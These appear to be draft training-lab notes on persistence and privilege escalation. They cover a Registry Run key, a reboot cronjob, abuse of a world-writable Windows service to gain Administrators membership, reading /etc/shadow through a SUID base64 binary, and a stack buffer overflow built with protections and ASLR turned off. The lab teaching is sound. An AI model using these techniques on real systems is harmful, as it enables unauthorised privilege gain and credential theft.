# Persistence and Privilege Escalation
image

intro

**Objectives**
1. lol

## Post Exploitation
## Persistence 

Windows Persistence Techniques

> [!activity] Activity - Windows Persistence with Registry

> [!exercise] Exercise - Windows Persistence with Registry
> Using the Windows VM in Bridge Adapter network mode, you will add a Run Registry Key to launch the calculator app as a placeholder for malware.
> #### Step 1 - Add the Key
> Launch a command prompt and add the calc.exe to the Registry’s Run Key.
> ``` powershell
> reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v NotEvil /t REG_SZ /d "C:\Windows\System32\calc.exe“
> ```
> #### Step 2 - Reboot and Execute
> Reboot the Windows VM and observe the calculator app launches at login!
> #### Step 3 - Remove Persistence
> Launch the Registry Editor as Administrator accepting the UAC prompt. Navigate to “Computer\HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run” and observe the Key “NotEvil”.  Right click the NotEvil entry and Delete.

Linux Persistence Techniques

>[!activity] Activity - Linux Persistence with Cronjob

> [!exercise] Exercise - Linux Persistence with Cronjob
> This task uses the Ubuntu VM in Bridge Adapter mode to schedule a cronjob that launches bash commands as a stand in for malware.
> #### Step 1 - Create the Cronjob
> Launch a bash terminal and add a cronjob that runs the date command and redirects the standard output to cron.txt file on your user’s desktop. Make sure to replace `USER` with your Ubuntu user’s name. Then run crontab -l to review and confirm the job setting.
> ``` bash
> echo "@reboot date > /home/USER/Desktop/cron.txt " | crontab 2> /dev/null
> crontab -l
> ```
> #### Step 2 - Reboot and Exploit
> Reboot the Ubuntu machine, login, and observe the cronjob created a cron.txt file on the desktop!
> #### Step 3 - Remove Persistence
> Open a terminal and remove the cronjob.
> ``` bash
> echo "" | crontab 2> /dev/null
> crontab -l
> ```
## Privilege Escalation
Windows Privilege Escalation Techniques

>[!activity] Activity - Windows Service Privilege Escalation

> [!exercise] Exercise - Windows Service Privilege Escalation
> You will create a vulnerable service and then escalate your privileges by exploiting this service in your Windows VM with Bridge Adapter network mode.
> #### Step 1 - Setup Vulnerable Service
> Start command prompt as administrator and create a vulnerable service that we will use for privilege escalation.
> ``` powershell
> sc create vulnerable binPath= "C:\Windows\system32\SearchIndexer.exe /Embedding”
> ```
> Add User Permissions to modify service. The WD at the end of each Allow statement make each permission set world available.
> ``` powershell
> sc sdset vulnerable "D:(A;;CCLCSWRPWPDTLOCRRC;;;WD)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)(A;;CCLCSWLOCRRC;;;WD)(A;;CCLCSWLOCRRC;;;WD)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)"
> ```
> #### Step 2 - Tester User
> The tester user may already exist from previous labs. Open a regular command prompt (non-administrator) and check the user list and confirm the tester user is present.
> ``` powershell
> net user
> ```
> If the tester user is not present, create the user.
> ``` powershell
> net user tester /add
> ```
> Confirm the tester user IS NOT present in the Administrators group.
> ```powershell
> net localgroup administrators
> ```
> #### Step 3 - Exploit Service
> As normal login user, launch a command prompt (not as admin). Modify the vulnerable service to add the tester user to the administrators group.
> ``` powershell
> sc config vulnerable binpath= "net localgroup administrators tester /add"
> ```
> Start the vulnerable service to run the payload. Observe that the service “FAILED”.
> ``` powershell
> sc start vulnerable
> ```
> Check administrators again and observe the tester user now has privileges escalated! Even though the service start command failed, it still ran in an elevated context and executed our code.
> ``` powershell
> net localgroup administrators
> ```
> #### Step 4 - Tear Down the Vulnerable Service
> Open a command prompt as administrator
> ``` powershell
> sc delete vulnerable
> ```

Linux Privilege Escalation Techniques

> [!activity] Activity - Linux SUID Privilege Escalation

> [!exercise] Exercise - Linux SUID Privilege Escalation
> In this task you will create a vulnerable SUID binary and then exploit it to escalate privileges to the root user using the Ubuntu VM in Bridge Adapter network mode.
> #### Step 1 - Create Vulnerable SUID
> Install a base64 binary with the root SUID bit set in the current directory. Then list the file and observe it is owned by root and world executable. This means that any user on the system can run the binary as the root user.  Don’t miss the period at the end of the command.
> ``` bash
> sudo install -m =xs $(which base64) .
> ```
> #### Step 2 - Abuse SUID
> As your normal user, try dumping the contents of the shadow file which should only be accessible by root. Observe that permission is denied.
> ``` bash
> cat /etc/shadow
> ```
> Abuse the base64 SUID binary to display the contents of the shadow file. The “./” preceding the base64 binary runs the vulnerable binary located in the current directory. The full command base64 encodes the shadow file and pipes the results to base64 with the decode flag, which displays the full contents of the privileged file!
> ``` bash
> ./base64 "/etc/shadow" | base64 --decode
> ```
## Buffer Overflows
initial access or privesc
Assembly
Registers
Address Space
Stack and Heap
Debuggers
Endianness
Buffer Overflows
Overflow Security

> [!activity] Activity - Stack Smashing the Hidden Funciton

> [!exercise] Exercise - Stack Smashing the Hidden Function
> In this task you will exploit a stack-based buffer overflow vulnerable C program using your Kali VM in Bridge Adapter network mode.  You will install the needed tools, build the vulnerable application, discover the buffer overflow, then build an exploit that will execute the hidden function.
> #### Step 1 - Install GDB
> GNU debugger (GDB) is used to debug in-memory applications and is very useful for finding and exploiting buffer overflows. First update your system and then install gdb.  Accept default settings in prompts by pressing enter.
> ``` bash
> sudo apt update -y
> sudo apt install gdb -y
> ```
> #### Step 2 - Install Peda
> Next, install Peda after GDB is installed. The peda extension for GDB offers additional utilities.
> ``` bash
> git clone [https://github.com/longld/peda.git](https://github.com/longld/peda.git) ~/peda
> echo "source ~/peda/peda.py" >> ~/.gdbinit
> ```
> #### Step 3 - Create the Vulnerable Binary
> Create a C program using the following code and then compile it without any security settings.
> ```bash
> vi program.c 
> ```
> While in the editor, add the following code.
> ``` c
> #include <stdio.h>  
> void hidden(){  
>         printf("Congrats, you found me!\n");  
> }  
> int main(){  
>	 char buffer[100];  
>         gets(buffer);  
>         printf("Buffer Content is : %s\n",buffer);  
> }
> ```
> Once the file is created, compile it using gcc.
> ``` bash 
> gcc  -no-pie -fno-stack-protector -z execstack program.c -o program
> ```
> #### Step 4 - Disable ASLR
> Left enabled, ASLR will randomize the program’s addresses each time it is ran.  You will disable this security setting for ease of demonstration.
> ``` bash
> echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
> ```
> #### Step 5 - Explore the Binary
> Explore the application by running it and entering a short value.  *Note, you may need to update the program’s permissions to allow execution.*
> ``` bash
> chmod +x program
> ./program
> ```
> Then enter “lol” and observe the program outputs the buffer content.
> #### Step 6 - Find the Overflow
> Create an input file of all “A”s then run it in the GDB debugger. Observe the RBP register is filled with the letter “A” or 0x41 in hex.
> ```bash
> python -c "print('A' *200)" > input.txt
> gdb -q ./program
> ```
> While in GDB, execute the following command to run the application with the input file and observe a segmentation fault (overflow).
> ``` gdb
> run < input.txt
> ```
> #### Step 7 - Find the Offset
> Create a nonrepeating pattern and run it in the program to detect which byte/character position overwrites the RIP pointer register.  While in GDB run the following commands
> ``` gdb
> pattern create 125 pattern.txt
> run < pattern.txt
> ```
> The program will crash at a return address. This address, which is located in the RIP register as well as the last line of GDB output, isn’t a real address. It is in fact a segment of our pattern that was overwritten to the RIP. The RIP expects an address for a value but received our pattern text which doesn’t point to a real address so the program crashed. You can use this fake address value and lookup what offset position it is in as part of our full pattern. Make sure to replace `ADDRESS` with the value you detected. The offset may be 120 characters.  While in GDB run the following:
> ``` gdb
> pattern offset ADDRESS
> ```
> #### Step 8 - Verify RIP
> Open another terminal and create a rip.txt file payload that is designed to overwrite the RIP with the letter “B” (\x42). Then run the program with the rip.txt input within GDB.  While in a terminal (not GDB), run the following to create the rip.txt file.
> ```bash
> python -c 'print("A"*120+"BBBBBB")' > rip.txt
> ```
> In the GDB terminal, run the following to execute the binary with the rip.txt file.
> ```gdb
> run < rip.txt
> ```
> Observe the RIP/overflow address is 0x000042424242! 42 in hex is the letter B, so you have now proven we can overwrite the RIP address pointer with any value of our choosing and can hijack the program to run anything you want.
> #### Step 9 - Find Hidden Function Address
> Now that you control the RIP, you want to redirect the program to the hidden function. You must first determine the hidden functions address space in memory.  Run the following command while in GDB to identify the memory address of the hidden function (Eg “0x401146”).
> ```gdb
> p hidden
> ```
> #### Step 10 - Exploit Payload
> Craft exploit to point RIP to hidden function address. Remember little endian format which places the 6 bytes in reverse order and uses 00 for any missing bytes. In your non GDB terminal, craft an exploit.txt replacing the RIP section (Bs) with the hidden function’s address in little endian format. Use the hidden function's address discovered during the previous step which is 3 bytes long. Prepend three sets of 00s to make the address 6 bytes long (Eg "0x000000401146"). Next reverse each byte position remembering that a byte is 2 characters (Eg "461140000000"). Finally format each byte with a preceding “\x” which is acceptable shellcode (Eg "\x46\x11\x40\x00\x00\x00"). Use this value in the following command's `SHELLCODE` placeholder.  From a non GDB terminal, run the following command to create the exploit.txt file, make sure to change your little endian address if/as needed.
> ```
> python -c 'print("A"*120+"SHELLCODE")' > exploit.txt
> ```
> Observe hidden function message “Congrats, you found me!”!
